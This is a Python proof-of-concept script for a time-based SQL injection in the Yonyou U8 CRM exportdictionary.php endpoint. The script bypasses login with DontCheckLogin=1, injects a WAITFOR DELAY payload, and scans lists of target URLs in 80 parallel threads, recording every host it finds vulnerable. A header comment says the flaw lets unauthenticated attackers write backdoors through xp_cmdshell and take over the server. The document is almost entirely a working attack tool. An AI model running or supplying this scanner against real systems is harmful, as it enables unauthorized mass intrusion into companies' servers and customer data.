# 用友U8_CRM_exportdictionary_SQL
# body="用友U8CRM"
# 产品简介:用友U8 CRM客户关系管理系统是一款专业的企业级CRM软件，旨在帮助企业高效管理客户关系、提升销售业绩和提供优质的客户服务。
# 漏洞概述:用友 U8 CRM客户关系管理系统 exportdictionary.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
# GET/SQL延时注入

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
            \x1b[38m██╗   ██╗ █████╗          ██████╗██████╗ ███╗   ███╗
            \x1b[36m██║   ██║██╔══██╗        ██╔════╝██╔══██╗████╗ ████║
            \x1b[34m██║   ██║╚█████╔╝        ██║     ██████╔╝██╔████╔██║
            \x1b[35m██║   ██║██╔══██╗        ██║     ██╔══██╗██║╚██╔╝██║
            \x1b[31m╚██████╔╝╚█████╔╝███████╗╚██████╗██║  ██║██║ ╚═╝ ██║
            \x1b[33m ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Vession:用友U8_CRM_exportdictionary_SQL
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("用友U8_CRM_exportdictionary_SQL")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = "/devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1"
    url_payload2 = "/devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:5%27--"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'PHPSESSID=bgsesstimeout-;',
        'Connection': 'close',
    }
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=7)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 4.5:
            print( f"[+] {target} 存在漏洞")
            with open('用友U8_CRM_exportdictionary_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except :
        print(target+"--站点连接异常--")

if __name__ == '__main__':
    main()